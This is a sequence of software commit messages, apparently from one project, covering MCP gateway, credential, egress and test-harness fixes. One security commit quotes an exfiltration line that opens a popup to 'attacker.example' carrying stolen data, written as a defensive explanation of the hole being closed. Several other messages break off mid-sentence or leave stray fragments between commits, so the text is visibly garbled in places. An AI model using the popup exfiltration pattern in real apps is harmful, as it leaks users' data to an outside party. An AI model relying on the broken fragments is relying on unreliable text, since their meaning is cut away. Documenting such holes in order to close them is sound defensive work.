test(web): guard the connection detail drawer's two fixes (D75)

McpConnectionDetail had no test file, so both fixes that landed in it were unguarded: M4's
identity check on an in-flight tool list, and the readable failure the listing reports when

test(web): read the mock gateway's host port from the stack's env (D76)

CR8 made both gateway mocks publish on a per-stack host port, because they were the last
literal ports in the dev compose files and a second stack could not bind them. The browser

The default now follows AGENTA_MOCK_MCP_GATEWAY_PORT, which env.sh writes into the stack's
env file, and keeps 9092 for a stack allocated before the change.

fix(web): a turn carrying only a server notice is not an empty turn (D78)

Three separate rules decide what counts as a turn's content — the transcript's visible-part
predicate, the shared turn status, and the desktop's own copy of it — and none of them knew
about `data-mcp-server-failed`. So a turn whose only part is the MCP server notice read as
empty: it collapses after another empty turn, renders as a settled no-response failure, and
drops out of the streaming gate. Which is the one turn where the notice is the whole answer,
because the model asked for a tool on a server that never joined.

All three now count it, off one named constant that replaces the four spellings of the part
type. Three cases, one per rule, plus a rendered case that the desktop no longer collapses
the row; each fails with its own rule put back.

test(web): pin the connect dialog's seal while a grant is being saved (D29, D84)

D29's fix has two halves. The reducer half — `saving` counts as connected, so a cancel from
there deletes nothing — is pinned by the journey's own suite. The dialog half, sealing the
close routes that a disabled footer does not cover, was not: deleting the three props and
the handler's own guard left every case green.

Four cases over the real dialog with the journey held at one status: no X and no Escape
while saving, and both back while the row is only being created, so a seal keyed on "busy"
rather than on "connected" fails too. The mask route is deliberately not covered and the
file says why — under jsdom the case cannot fail, which is worse than no case at all.

test(web): exercise D50's structural cause, not the marker beside it (D85)

D50 made the refusal reader answer from three places, one of which is the data plane's
JSON-RPC envelope: no `detail`, the cause stated in `error.data.cause`. Every case standing
over it also carried the harness marker in the message, so the last-resort marker scan
answered them all and that branch could be deleted with the suite green.

One case with a message written for a person and no marker in it, so only the structural
read can answer. Verified by mutation: deleting the branch fails it and nothing else.

fix(web): mount the tool catalog in a mobile automation run (D87)

The catalog drawer opens by setting an atom, so a surface that can open it has to mount it.
The session workspace does; the automation run pane, which mounts the same conversation, did
not. So an agent asking to connect a built-in server inside an automation run opened nothing
and the turn parked on a drawer that never appeared, with no way to settle the tool call.

Mounted the same way and for the same reason as the workspace's, which is now written down
in both places.

fix(web): trim the MCP gateway switch, do not squeeze it (D35 residual, D89)

D35 taught three parsers the same vocabulary for this flag, but not the same normalization.
The API strips its value and the browser trims its own, so both read "y es" as a spelling
they do not know and turn the plane off. The container's shell deleted every space instead,
so it alone read that as "yes" — leaving the interface offering a feature its own API
refuses, which is the one disagreement this switch exists to prevent.

The extracted-script test gains the case. Verified by mutation: putting the squeeze back
fails it on `y es` and nothing else.

chore(web): remove the MCP work's dead code (D86)

Three groups, each with no reader anywhere in the tree.

The connect journey returned `stopWatch` alongside `abandonAttempt`, which already calls it.
No caller ever took it, and one that did would stop the consent watch while leaving the
attempt live — the half-teardown D34 was about.

The server notice carried four fields nothing read: `reasonCode`, `code`, `target` and
`endpointId`. The first and last are gone outright, with the connect-path parser that only
fed `endpointId`; the other two stay as locals, because the refusal code decides
`needsAuthorization` and the target is where the slug comes from.

And eight barrel lines re-exported values nothing imports. The module exports stay, so each
is still reachable by its own path; only the barrel line goes.

`registerChatSkin` is deliberately NOT removed. It is a writer nobody calls, but the store
it writes has three live readers, it is the documented route by which a host overrides a
tool's display or an approval's body, and the desktop's own tool-display module names it as
such. Deleting it removes a capability rather than dead weight, which is a decision about
the chat re-plumb and not a review cleanup.

fix(sdk): D88 carry the runner's ladder on the wire, not just in Claude's rules

D88 was fixed in the Claude settings adapter, which changed only how one harness
renders its native rules. `MCPPolicy.resolved_new_tool_permission` still read
`new_tool_permission or permission or "ask"`, and that value becomes
`newToolPermission` on the wire, which the runner honours verbatim. So on the
shipped path `permission: allow` beside any per-tool table still sent
`newToolPermission: allow`, and a tool the author had never named still ran
unapproved under EVERY harness, Claude included. Measured directly: permission
allow, tool_permissions {echo: deny}, new_tool_permission unset gave wire
newToolPermission allow.

An unnamed tool now resolves to `new_tool_permission or "ask"` and never to the
whole-server permission. The method's own docstring already said that ("a run
default of allow must not silently widen a server whose author took the trouble
to write a per-tool table"); only the expression disagreed.

The no-table case is unchanged and needed no runner change: with neither field
set this returns None, `to_wire` emits neither key, the runner's intake never
opts in, and `mcpToolPermission` returns the whole-server permission exactly as
before per-tool policy existed. Confirmed against
`services/runner/src/mcp-permission.ts` rather than assumed.

One policy is read three times on the way to a decision, and a fix applied to
one reading is not a fix. The new matrix crosses all three — the SDK resolver
into the wire, the runner's intake and ladder, and the Claude adapter into
native rules — on every server decision by every new-tool default by every
per-tool entry, resolving both a tool the table names and one it does not, and
asserting the `to_wire` output itself.

Why this survived: the only existing test covering the fallback used
`permission="ask"`, where the old ladder and the correct one give the same
answer. Its comment is corrected. Restoring the old expression now fails six
cells.

fix(gateways): block the carrier-grade NAT range on every plane (P10)

Python's ipaddress answers False to all six predicates for 100.64.0.0/10 and
does not carry it in its private-networks table, so a target resolving into it
read as public on every plane that shares the guard. The range is in everyday
use for cloud pod and service networks and for some mesh VPNs, and a gateway
endpoint URL is supplied by the tenant, so reaching one is the feature rather
than an administrator's misconfiguration: the relay attaches the connection's
stored credential before it goes.

Added to the three Python copies and to the generator the runner's table and
both languages' vector fixtures are built from, so the runner needs no change of
its own. IPv4-mapped IPv6 is unwrapped the way ipaddress unwraps for its own
predicates.

The copies are now compared rather than trusted: a new case walks every vector
through the API's two predicates, which is what nothing did before and how one
missing range came to be missing from all of them at once. Removing it from any
copy fails that case.

test(gateways): drive the mock upstream the way a conforming client must (D54)

The mock now enforces what a real server enforces: every request after
initialize carries MCP-Protocol-Version, and it must be the version the server
negotiated rather than the one the client asked for. It also answers tools/list
as an event stream, sends a notification before the response, and pages one tool
at a time. These two cases sent no header, read the body as one plain JSON
object, and took the first page for the whole catalogue.

They handshake now and read the negotiated version rather than pinning a string,
find the answer by its frame rather than by position, and follow the pagination
to the end. A reader that stops at the first page sees one tool and calls it the
catalogue, which is the thing a gateway must never do.

fix(tests): combine the caller's marker expression with the generated one (P7)

pytest honours the last -m it is given, and all three run-tests wrappers append
their own after the forwarded arguments. A caller asking for -m acceptance was
therefore overruled whenever a selection or dimension flag was also set, and
hosting/docker-compose/test.sh always injects --fast, so it took that path every
time. The operator got a different selection from the one they asked for, and a
green answer to a question they did not pose.

The caller's expression is pulled out of the forwarded arguments and joined to
the generated ones, so exactly one -m reaches pytest and both halves are in it.
All three spellings pytest accepts are recognised.

The wrappers had no tests at all, which is how this survived in three copies.
The suite drives all three and reads the command off the subprocess call, so it
asserts what pytest would actually receive.

fix(tests): stop reading an option's value as a test target (P11, P12)

All three wrappers decided the caller had named what to run by looking for any
forwarded argument that contained a slash, ended in .py, or held a node-id
separator. An option's value is none of those things to the caller and all of
them to that check: --basetemp /tmp/x and --ignore some/dir both end in a token
with a slash. The resolved license and layer directories were dropped, pytest
fell back to the testpaths in its own config, and the run covered a different
suite and reported green.

Only positional arguments are considered now, with the value of a value-taking
option skipped. The option table is explicit rather than inferred, because
pytest also has flags that take no value and a positional after one of those is
a real target.

Five cases, two of which fail against the old check.

test(tests): hold the three run-tests wrappers to one another

The wrappers carry the same code in three copies, which is how both defects in
this pass were present in all three at once and how a fix applied to one could
be missing from the others without anyone noticing.

They are compared now: the option table must be identical across the three, and
the suite fails rather than quietly parametrizing over two if one moves. The
dimension exports are recorded as they behave today, so a change to them is a
decision rather than an accident.

test(webhooks): restore the environment before reloading, not after (P6)

The end-to-end egress case reloads two modules to prove the environment variable
itself reaches the guard. It used monkeypatch to set it, and monkeypatch restores
the environment only after the test function returns, so the reload in the
finally ran while the deprecated aliases were still deleted. On a process that
exports one of them the guard was left pinned to the default for every later test
in that worker, which is a false green in whatever ran next rather than here.

The environment is captured and restored by hand, before the reload, so there is
no ordering to get wrong. A second case reproduces the leak by exporting an
alias that says the opposite of the default, which is the only value the mistake
cannot land on by accident.

test(gateways): drive the data plane as a conforming client would (D54)

This suite sent tools/list and tools/call with no MCP-Protocol-Version header,
read the answer as one plain JSON object, and took the first page for the whole
catalogue. Against the strict mock every case fails, so it was only ever
exercising an upstream that agreed with it.

It handshakes through the gateway now and forwards the negotiated version, which
the relay's header allowlist already carries, finds the answer by its frame
rather than by position, and pages to the end. Verified against the running dev
stack: six cases pass, including the tool filter rewriting an event-streamed,
paginated listing down to the one tool the policy allows.

test(gateways): remove the connections this acceptance suite creates (P4)

It ran against a real deployment and left every connection it made behind. Unique
slugs mean the litter never collided, so it cost tidiness rather than
correctness, but a dev deployment accumulates a set per run: the stack this was
verified on holds 273 of them.

Both fixtures now remove what they made, and the per-case one replaces two

The EE compose guide said three free host ports: Postgres, Traefik HTTP and the

test(gateways): read the mock gateway's published port from the allocation (D76)

env.sh allocates a host port per worktree so two dev stacks can run side by
side, and nothing on the Python side read it. Six suites wrote 9092, so a stack
given another port had its host-side cases dial whatever was on 9092, or
nothing, without saying so.

One helper, because 9092 meant two different things in those files and picking

mock is elsewhere instead of reaching a stranger's.

test(gateways): hold every MCP acceptance suite to the session rules (D54)

Three more suites sent tools/list and tools/call with no MCP-Protocol-Version
header and read the answer with response.json(). Against the strict mock every
one of those cases fails, so each was measuring the mock's tolerance rather than
the gateway. The proxy suite had already been repaired and carried its own copy
of the repair.

One module now holds both rules a conforming client owes: the negotiated version
on everything after the handshake, and the answer found by its frame because a
server may stream it and may speak first. The version is read from the handshake
rather than written down, so a server that negotiates a different one keeps
these cases honest.

Verified against the running dev stack: the whole gateway acceptance layer is 48
passed, 4 skipped.

fix(web): the inherit label states what the run does for an unnamed tool (D88)

`resolvedNewToolPermission` read the whole-server permission as the floor for a tool the
per-tool table does not name. The runner's gate does not: a declared table with no floor
beside it resolves to `ask`, because a human decides for anything the table has not named.
So the editor's "Inherits allow" told an author that a `permission: allow` server would run
an unnamed tool unapproved, which is the unsafe direction and not what happens.

The SDK resolver is moving to the same rule in the same release, so the label, the wire and
the gate now agree. With no table declared nothing changes: the server permission still
governs every tool, which is what keeps a configuration written before per-tool policy
behaving as it did.

The editor is one component in @agenta/entity-ui reached through the shared config-item
registry, so classic and /m render the same label from this one function. Four cases added
or rewritten; the fallback put back fails two.

fix(web): a retry continues from the row the lost save already made (round 4, D3)

A create can land server-side and lose its response. The dialog then offers Try again, the
retry creates the same connection again, and the API refuses the name as taken — so the
person is told to rename a connection they already have, with the half-finished row sitting
behind the dialog at Needs authorization. The recovery action the dialog offers was
guaranteed to fail, and the only way forward was to invent a second name for one server.

Before refusing a taken name, the journey now asks whether the row holding that name IS the
one being made: same name, by the API's own normalization, and the same address. If so it
continues from that row instead of creating another. A name matching a DIFFERENT server is
still refused, because two connections to two servers cannot share one label.

An adopted row is not claimed. It is indistinguishable from one someone else made a moment
earlier, so cancelling leaves it exactly as it was found rather than deleting it.

Ten cases. The adoption removed fails one; the ownership flag ignored fails another.

fix(web): the agent summary counts MCP servers instead of calling them connected (round 4, D5)

D53 gave one state one word across the settings list, the connection drawer, the expanded
agent rail and the configuration dialog. The collapsed summary was left behind: it reads the
servers ON the agent and rendered the count as "1 connected", so a server disconnected a
moment earlier still read as connected in the one word the rest of the product now reserves
for the authorized state.

Whether a configured server is authorized is a live fact this card never reads, so it now
says what it actually counted, in the shape the neighbouring rows already use. One case,
which fails with the old wording put back.

fix(web): a field that refuses an entry says so to a screen reader (round 4, D4)

The MCP connect dialog's duplicate-name refusal renders a message and leaves the input with
neither aria-invalid nor aria-describedby, so a screen-reader user meets a Continue button
that silently stops working with no announced reason. Reported unchanged in three QA rounds.

Closed in Field rather than at the call site, because every field in the product with an
error line had the same gap. Field already injects an id to associate its label; it now
injects aria-invalid on an errored or invalid control, and aria-describedby naming the
description and the error lines, keeping any the caller wrote itself.

Eight cases. Seven in @agenta/ui follow the attribute to the element it names rather than
asserting the string, because an aria-describedby pointing at nothing announces nothing and
looks identical to a correct one. The eighth drives the real connect dialog to the refusal.
The wiring removed fails seven of the eight.

D4's second observation, that a doubled space makes a distinct name, is NOT changed: the API
compares the rendered harness tool prefix, where those two names genuinely differ, and its
own comment says so. The two sides agree, so moving the web alone would have made the client
refuse names the API accepts.

fix(web): a filtered row says why it survived the query (round 4, D6)

The tool filter matches a tool's description as well as its name, because a person looking
for "the one that files an issue" knows what it does rather than what it is called. The
connection drawer shows descriptions, so a description match reads correctly there. The
per-tool editor renders a description only for a tool that already carries a rule, so a
description match left a row on screen with nothing in its visible text containing the word:
typing "screenshot" kept exactly one row, called extract_images, and read as a bug.

While a query is active every row now shows its description, and goes back to saying what it
inherits once the query is cleared. The permission itself was never in that line; it is in
the control beside it, which is unchanged.

Two cases. The reveal removed fails one.

test(web): correct two harness defects CodeRabbit's test pass found (P15, P14)

well, and only those, because the app adds its own.

The P14 half carries no unit case: web/oss collects unit tests from `src`, and this is
Playwright harness code. The acceptance run is its own proof.

feat(gateways): give the mock a key-authenticated MCP surface, and carry the challenge

The connect journey reaches its API-key screen when the probe reports `unknown`,
which is what it already answers for a 401 that names no OAuth metadata. Nothing
could be pointed at that screen by hand: `/` on the mock is open, `/oauth/mcp`
publishes a protected-resource document, and the bearer profile on `/` is chosen
by an X-Agenta-Mock-Profile request header a browser never sends.

/key/mcp is the third answer. It challenges with a scheme and no metadata,
accepts the key under the registered header name or as the Authorization
fallback the adapter sends when an endpoint registers none, and relays through
the same handler as the other two so the framing rules stay in one place.

reports none.

fix(web): exclude the MCP relay from session interception

NOT FOR THIS RELEASE unless the lead says otherwise. Kept as one commit so it can
be dropped whole; the two defects it shipped with are in the commit before it.

The session library refreshes and retries on a 401 from the API domain, because
that is our session expiring. One route under that domain is not ours: the MCP
relay passes a call to a server the person chose, and that server's 401 means the
credential THEY supplied was refused. The two are the same at the transport, so a
rejected key was refreshed and retried ten times and the journey was handed a
failure with no status on it. The screen that exists to say "the server rejected
this key (401)" could not be reached, and the sheet reported an unreachable
server instead (D175).

The route is excluded from interception in both apps, so the two stay identical.
It costs no authentication: the session is carried in cookies on the same origin,
confirmed from a live session's stored state, so the browser attaches it whether
or not the library intercepts, and no refresh would have helped a call that was
never about our session. The exclusion is exactly one path, because excluding
more would leave real expiries unrefreshed elsewhere, which is a failure nobody
would trace back to here.

that turns an upstream refusal into 424 with the `upstream_error` cause is
guarded on the connection authorizing with OAuth. An API-KEY connection's refusal

A Daytona sandbox's daemon environment is built from `piExtEnv` plus the
model environment. The local daemon's `env` is not one of its inputs, so
the gateway credential written there existed only on a local run. In a

refused on both maps.

feature, which is on this pull request and not on main. `daytonaEnvVars`

the gateway feature itself and was never on main; no commit of the design
work touched this file.

environment with its value" — builds the runtime environment and then
builds the Daytona daemon environment from it through the same function
the provider calls, so it pins what Daytona is handed rather than the
placement. Mutation: remove the `piExtEnv` assignment and the case fails

fix(sdk): compose the gateway routes against the public API base

A Daytona run refused to start with "Invalid Daytona secret plan:
credential endpoint must use HTTPS". The MCP relay URL and the LLM
gateway endpoint are both composed from `gateway_base_url()`, which
returned `base_url()`, which the SDK derives from the OTLP endpoint,
which `ag.init` builds from `AGENTA_API_INTERNAL_URL` when one is set. So
a sandbox was handed `http://api:8000/api/gateways/...`: not HTTPS, and
with no route from a remote sandbox even if it were. Cloud sets an
internal URL too, so this was not only this stack.

`gateway_base_url()` now prefers the public `AGENTA_API_URL`, and only
that accessor changes: every one of its callers composes an address that
is written INTO a sandbox, while the calls this process makes itself (the
credential exchange, the vault) go through `base_url()` and keep the
in-network hop. It reads the public value through the SDK's own
`parse_url`, the reader the trace endpoint a dispatched run carries
already goes through, so a self-hoster's `localhost` base becomes
`host.docker.internal` here exactly as it does there and a local sandbox
keeps a reachable address; with no public base configured nothing
changes. `exactHttpsHost` is untouched.

Cases: test_connection, "is the public one when the two differ", "falls
back when no public base is set", "rewrites a self-hoster's localhost on
the bridge", "keeps an explicit pin". Mutation: stop reading
AGENTA_API_URL and the first and third fail with the internal base.

Runner side: daytona-secret-plan, "the gateway relay URL a Daytona run is
handed" — the public https base plans a secret restricted to that host,
the internal http base throws this exact message, and the same host over
https is still refused on its port. Mutation: drop the protocol check in
`exactHttpsHost` and the http case fails.

fix(runner): rebuild a Pi session when its MCP gateway credential rotates

A gateway credential lives fifteen minutes. Pi does not read the Daytona
Secret the plan allocates for an MCP credential: `buildPiExtensionEnv`
serializes the credential's own value into the create-time sandbox
environment, and that map is fixed once the sandbox exists. So a warm
turn past the rollover found `credentials-rotated`, updated a Secret this
run never consults, reported success, and continued the live daemon on
the credential it started with. The next MCP call carries an expired one.

The epoch already has the vocabulary for this. Its `direct` half is the
material no live delivery can reach, and `tryCredentialRoute` refuses to
reuse a session whose `direct` half moved. Pi's MCP credentials belong
there for exactly the reason `local_use` model credentials do: they are
baked into the daemon environment at create. The ACP harnesses are
untouched, because they hold the placeholder and rotating the record in
place really does change what they send.

NOT the fix the Codex review proposed. Serializing the placeholder into
Pi's config cannot work at that site: `allocateDaytonaSecrets` runs
inside the provider's `create`, after `piExtEnv` has already been
snapshotted into the create request's `envVars`, so there is no
placeholder to serialize yet. It would also put Pi's working cold path
behind Daytona's per-sandbox substitution fault, which the preflight only
guards when the run has a MODEL Secret candidate to probe.

Case: pi-mcp-credential-epoch, "moves the half no delivery can reach, so
the session rebuilds", with the ACP harnesses pinned deliverable beside

fix(api): an OAuth grant is write-only whatever the caller or the row says

Two ways a grant's tokens could be read back by a caller holding only
VIEW_SECRET. A vault create accepted `write_only=False` on any kind, and
the mark rides inside the encrypted JSON, so a row carrying none at all
read back as `False` and the control failed open.

`write_only` stays the creator's choice for every other kind: a provider
key someone pasted in is theirs to read back. A grant is not. Nobody
typed it, and its refresh token buys new access tokens for as long as the
grant lives.

One rule beside the kind enum, applied at the three places that each
answer a different question. `CreateSecretDTO` overrules the caller's
`False` rather than rejecting it, because the field is optional and a
refusal would fail requests that never asked for a readable grant. The
update mapping refuses to carry an old `False` forward, reading the kind
off the ROW so no request body can move a secret into or out of the rule.
And the response model forces it on the way out, which is what makes the
default fail CLOSED.

No data migration is needed, and that last point is why: an already
stored row is redacted where it stands, and the next update repairs its
stored mark. The product's own grant creation never sent the flag, so it
already took the `True` default; a row can lack the mark only if it
predates the mark or was created through the public route with an
explicit `False`, which is the reviewer's case.

Readers of the mark, all of them: `_value_status` and
`project_secret_response` in core/secrets/redaction.py, reached by
`redact_secret_response` and by the vault router, which passes
`reveal_write_only` from the resolve grant. Both read
`SecretResponseDTO.write_only`, and `map_secrets_dbe_to_dto` is the only
place that model is built from storage, so forcing it on the model covers
the cache rehydration too.

The broker is untouched: it reads the grant in process, below the
response boundary, and through a projection with `reveal_write_only`
set, neither of which consults the mark to decide.

Cases: test_write_only_oauth, "a caller cannot ask for a readable grant"
(asserted on the request, because the response model would force it
anyway), "a stored row with no mark is read as write only", "an update
cannot carry an old readable mark forward", "the broker still reads the
real grant". Mutation: disable any one of the three forcing points and
exactly its own case fails; make the projection ignore
`reveal_write_only` and only the broker case fails.

fix(api): give the gateway credential a lifetime a turn can finish inside

Every secret token expired at `iat + 900`. The gateway credential is one
of them, and it is not like the others: it is minted once when a run's
connections resolve, handed to the sandbox, and never re-minted or
replaced while the turn runs. So fifteen minutes was not a bound on
exposure, it was a ceiling on how long a single turn could reach an MCP
server or the LLM gateway, and turns longer than that are ordinary.

`sign_secret_token` takes an `expires_in`, and only the gateways
credentials route passes one. Every other caller mints for a browser or a
short server-to-server hop, where the short life is the point, and keeps
900. A non-positive override falls back rather than minting an
already-dead token.

The new setting is `AGENTA_GATEWAYS_CREDENTIALS_TTL_SECONDS`, read
through the shared env object, default 43200. That is the same twelve
hours `MountsConfig.credentials_ttl_seconds` uses and for the same
reason: it has to sit above the runner's total run deadline, or the
credential dies under a turn that was still allowed to be running.

Nothing else assumed 900 for this token. The SDK and the runner treat it
as an opaque string, never decode it and never cache it against an
expiry; no test pinned the number.

The token is otherwise unchanged, and the cases that already pinned that
still pass: no grants on it, refused with `audience_mismatch` on the
vault route, on an ordinary platform route and on the credential route
itself, and it still names one project and one run.

Cases: the minted credential's `exp - iat` equals the setting; an
ordinary secret token still gets 900; an operator's override is honoured.
Mutation: drop `expires_in` at the route, or ignore it in the signer, and
the two gateway cases fail; raise `_SECRET_EXP` to the same 43200 and the
ordinary-token case fails.

fix(api): follow the gateway egress setting when saving a custom MCP endpoint

Save time and call time were asking two different questions about one URL.
Registration checked a custom MCP endpoint's base_url with
`validate_url_format_and_literal_ip`, which reads the webhook flag
`AGENTA_INSECURE_EGRESS_ALLOWED`. The relay that later dials that same URL applies
the gateway policy instead: `open_egress` passes
`AGENTA_GATEWAYS_INSECURE_EGRESS_ALLOWED` into the range check and first exempts any
host in `AGENTA_MCP_GATEWAY_HOST_ALLOWLIST`.

The two flags ship with opposite defaults, the webhook one permissive and the gateway
one closed, so on a default multi-tenant deployment a plain-HTTP or private-address
MCP URL was accepted into a tenant's endpoint list and then refused by every call made
to it. An endpoint that cannot be called is not a saved endpoint. It is now refused at
save time, with the same message the relay would have given, at the point where
someone can still fix the URL. The mirror case is a self-hoster who has opened the
gateway flag, as the self-host env templates do: their private MCP server saves and
calls for the same reason instead of being blocked by a flag their relay does not read.

`validate_url_format_and_literal_ip` gains `allow_insecure` and `label`, mirroring the
keywords `resolve_validated_ip` already carries in the same module; both default to
today's behaviour, so the webhook callers, `core/secrets/dtos.py` and
`core/providers/endpoints.py` are unchanged byte for byte. The new
`validate_egress_url_format` in `core/gateways/egress.py` is the save-time counterpart
to `open_egress` and deliberately resolves no names, because a save-time resolve would
refuse a momentarily unreachable hostname and would settle nothing anyway.

The LLM gateway router has the identical disagreement and is untouched here, left for
its own change.

strands it inside the sandbox. commonEnv would have put it on four
containers that never read it and still missed the runner, whose
environment stays narrow because a local harness process shares it.

[fix] Count the thinking timer from the run, not from the tab

Opening a tab on a response already in progress started the elapsed clock at
zero, so a run that had been going for a minute read as a fresh one. The clock
is a local span keyed by turn, and a tab that was not there when the run began
had none to count from, so it stamped the start at the moment it first painted.

The run's start now seeds that first span, read off the trace root span. It is
the same source the timestamp beside the clock already trusts over the client's
own first-seen stamp. A run this tab streamed from the start needs none of it:
its own first step is the start, so it never fetches a trace mid-stream.

The trace resolves a beat after the clock has to start, so a late start
back-dates the running span once, and only backwards. Pause and resume still
shift by the gap, keeping time parked on the reader out of the count.

fix(api): let a never-sent first turn be retried

A template load claims dispatch before invoking the workflow service and nothing
ever released that claim, so one transient failure burned the Idempotency-Key:
the agent existed and its first turn could never start.

(no URL, unusable URL, connection refused, unresolvable host, connect timeout,
pool timeout). A read timeout, a write error part-way through the body and any
HTTP status stay at-most-once, unchanged. The release is a compare-and-set, so
two retries racing after one still dispatch exactly once.

Also in the same first-turn path:

and https check on every gateway target, and the refusal to send a run's
bearer credential over plain http to a routable address.

key off hasKey, so nothing renders and the code default stands, while an

fix(api): prove never-sent from the response, not the exception type

Review found the release never fires for the failure it was written for.
AGENTA_SERVICES_URL is a public origin in front of a reverse proxy in every
topology, so stopping the services container does not give the API a connection
error: the proxy's catch-all answers with an HTML 404, and that was classified
ambiguous.

The detached start now raises WorkflowDetachedStartNeverSent when the response
proves the service never saw the request: status 404 or 503 with no x-ag-*
header. 502 and 504 stay ambiguous, because a gateway that forwarded and gave up
may have handed over an accepted run, and any response the service builds itself
carries x-ag-version, so its own 404 or 503 keeps the claim too.

Also from the review:

- drop the lock_timeout added to migration 033. It already ran on both stages, so
  alembic would execute the new statement for the first time in production, where
  firing it aborts the whole migration chain.
- Postgres-backed tests for claim_dispatch and release_dispatch. Deleting either
  compare-and-set guard from the release now fails the suite; before, both could
  be deleted with it green.
- pin the ordering (a durable run keeps the claim), every member of the
  never-sent set, a failing release, and a cancelled invoke.
- state the single-releaser invariant where the SQL cannot enforce it, and test
  that it stays single.
- the session-input conflict answers idempotency_key_reused, the code the
  sessions router already uses for it.
- resolve_secrets accepts the old call shape and raises a TypeError carrying the

fix(frontend): refetch a turn's trace when its run settles

A turn a tab meets mid-flight reads its trace while the run is still
going (#7013), to count from the run's start rather than from the tab.
A run's spans only reach the backend in one batch when the run ends, so
that read finds no such trace, and trace queries keep what they learn
for the life of the page (staleTime Infinity, retryOnMount false).
Nothing refetched them when the run settled, so the turn showed a plain
"Worked" with no duration, no timestamp and no latency for good.

markTraceAsFresh already runs the moment a run's stream closes. It now
also drops that one trace's cached summary and entity queries, so the
next read fetches the trace that exists by then. The mark still happens
first, which gives that refetch the full not-found retry ladder to
cover the ingestion lag.

fix(frontend): pin that an unwatched trace read leaves no error behind

Settling a run refetches only the trace queries something still watches.
That is enough while an unwatched query keeps no error to get stuck on,
because a query that errored with no data does not fetch on its next
mount either (retryOnMount: false). The query wrapper drops that state
when the last observer goes, so the case cannot arise today.

That was an assumption, so it is now a test rather than a belief, and
the call site says to switch to resetQueries if it ever stops holding.

fix(api): do not read a redirect-hop failure as never sent

The detached invoke follows redirects, so httpx may issue up to twenty requests
and a connect failure can belong to hop two. Hop one was answered by whatever
sent the 3xx, and a proxy that redirects a POST may have forwarded it, so the
exception type alone proved nothing.

The transport decides now, where the URL is known: a never-sent transport error
is classified as such only when the failing request is the one we addressed,
compared as httpx.URL because the raw strings differ for an explicit default
port or an uppercase host. Reading those as a redirect would keep the claim on a
plain connection refusal, which is the failure this release exists to free.

The service-level set therefore holds only the two markers this domain raises.
A bare httpx error reaching the caller can only have come from a redirect hop or
from outside the send, and neither is proof.

fix(api): state the true reason the header rule is safe, and pin it

Review found the comment justifying the never-sent rule asserts something
false: that any response the workflow service builds carries x-ag-version. The
three 503 sites the comment itself lists are bare JSONResponses with no header.

The real reason has two halves, and only one of them lives in code. A failure
inside a run leaves as a batch response with a status >= 400, which goes out
through _make_json_response and is stamped; a run that has begun streaming has
already committed 200, so it cannot present a failure as a status at all. The
unstamped 404 and 503 answers are all structurally in front of the workflow.

The first half is now pinned on the SDK side, because the rule fails open: an
unstamped in-run 503 would read as never-sent and let a retry run a turn that
already executed its tool calls.

Two more invariants that were true only by default:

- the first turn's request must not set on_busy. It would turn on session
  admission, whose lost-response 503 carries no header and can follow a
  committed pending-input row. A comment says so where the request is built,
  and a test fails if anyone sets it.
- the cancellation comment claimed a cancel cannot strand the claim before the
  invoke begins. Two narrow windows do, and they are named rather than papered
  over.

test(api): drive a real redirect, and pin the narrowed types

Review found that narrowing the caller-facing never-sent set left three of its
former members untested: putting httpx.InvalidURL, UnsupportedProtocol and
PoolTimeout back produced zero failures, so a refactor could have re-broadened
it silently and reintroduced the redirect-hop false positive. They now sit in
the ambiguous list beside ConnectError and ConnectTimeout.

It also found that every redirect hop was a hand-built exception, so the tests
assumed httpx attributes the failing hop rather than proving it. Four cases now
run httpx's own redirect machinery over a MockTransport, which raises UNBOUND
errors and lets httpx do the binding: a 307 to an unreachable hop keeps the
claim, the same refusal without a redirect releases it, a redirect loop ends in
TooManyRedirects, and a body that dies before its first record stays ambiguous.
A socket would add the kernel and nothing else; the attribution under test is
client-side.

Two assertions that could not fail now assert identity instead, so they pin that
the original error propagates unwrapped. The third is load-bearing and says so:
WorkflowDetachedStartNeverSent subclasses the type its pytest.raises catches.

test(api): assert the first turn's payload across the row, not before it

Review noted the on_busy test read the dict the double was handed, so a key
added on the way to storage would have passed. The double now round-trips
content through JSON the way the row does, and the case asserts at the builder,
after that round trip, and on what is finally sent.

fix(frontend): stop an attachment-only send carrying an empty text part

Attach a file, leave the composer empty and press Enter, and the outbound message
carries `{type: "text", text: ""}` as its first part. The SDK keeps any text that
is not None, so the model receives an empty text content block, and
Anthropic-family models refuse those. On a first turn that is the whole run.

v0.119.0 built these parts with the AI SDK shorthand, which omitted the text
entirely for a file-only send. Two of the three send sites replaced that shorthand
with an explicit message object in this release and dropped the guard with it. The
third, the durable path, kept it, which is the evidence the loss was an oversight.

All three sites now build their parts through one `outboundUserParts` helper in
`@agenta/chat/assets`, so the guard cannot go missing on one of them again. It
guards on the text actually sent, `executionText ?? text`, which also fixes the
durable path: a file-only send with a pending display edit used to drop that edit,
because the old guard tested the displayed text. The text-then-files order from
this release is unchanged.

Unit tests cover the helper directly and each of the three paths.

fix(runner): stop the relay loop spinning after a turn abort

The turn's abort signal is forwarded into the tool relay's wake source, and
both sources answer an aborted wait with "closed" on sight while isHealthy()
keeps reporting true until close() runs. Only stop() closes a source, so the
loop kept choosing its wake-source branch and iterated at zero delay over
microtasks alone: the event loop never reached its timer and I/O phases, and
the teardown that calls stop() could never be scheduled.

The signal now disqualifies the source alongside isHealthy(), dropping the
loop to the sleep branch, and a floor under every wait keeps any future
source from reintroducing the spin. The floor is skipped once stop() has
cleared `active`, so teardown still ends a turn without waiting a poll delay.

fix(entities): close the app's egress channel — drop allow-popups

"The app cannot reach the network" was not true. `default-src 'none'` stops
fetch, XHR, WebSocket and image beacons, and every one of those is blocked.
It does not stop NAVIGATION: CSP's fetch directives do not govern it and
`navigate-to` never shipped in browsers. With `allow-popups` on the iframe, an
app could call

    window.open("https://attacker.example/?d=" + stolen)

synchronously inside any click it already handles — a card, a button — then
close the window. The data leaves in the query string and the window is gone
before it is noticed.

Verified against the real assembled document, same CSP, only the sandbox
attribute differing. With `allow-popups` the listening server logged
`GET /EXFIL?d=board.json:{cards:[secret]}`; without it, nothing arrived.
(The exploit has to read its data BEFORE the click: an `await` first loses
transient user activation and the popup blocker eats the open. Pre-reading is
not a hurdle.)

This matters more than the folder scope it sits beside. Climbing out of the
folder only pays off for an author who can already read the drive; a popup pays
off for anyone, from an app that stays politely inside its grant. The grant
says "read this folder" and what it permitted was "publish this folder".

Drops `allow-popups`, and names `form-action 'none'`, which does not inherit
from `default-src` and closes the form-submit variant. An app that wants an
external link still has one: the click reaches the host as a `nav` message and
the host decides, so the person sees where they are going.

#6529 asked "do we need popups in Run mode, or can we tighten the current
iframe flags?" The answer is that we do not, and we can.

docs(agent-apps): name the egress surface in the contracts

